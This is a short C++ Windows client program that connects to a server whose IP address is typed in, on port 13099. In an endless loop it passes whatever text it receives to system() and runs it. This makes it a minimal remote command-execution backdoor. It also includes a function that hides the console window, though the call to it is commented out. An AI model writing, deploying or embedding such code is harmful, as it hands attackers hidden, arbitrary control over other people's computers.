// Client code
// Author: Szymon Kocur

#include <stdio.h>
#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int main(int argc, char * argv[])
{
    //stealth();
	WSADATA wsa;
	int result = WSAStartup(MAKEWORD(2, 2), &wsa);

	SOCKET mainSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	std::cout << "IP of server: ";
	char ip[20];
	std::cin >> ip;

	sockaddr_in service;
	memset(&service, 0, sizeof(service));
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr(ip);
	service.sin_port = htons(13099);

	if (connect(mainSocket, (SOCKADDR *)& service, sizeof(service)) == SOCKET_ERROR) {
		printf("Failed to connect.\n");
		getchar();
		WSACleanup();
		return 1;
	}

	while (1) {
        char recvbuf[400] = "";
		recv(mainSocket, recvbuf, 400, 0);
		system(recvbuf);
	}

	getchar();
	return 0;
}
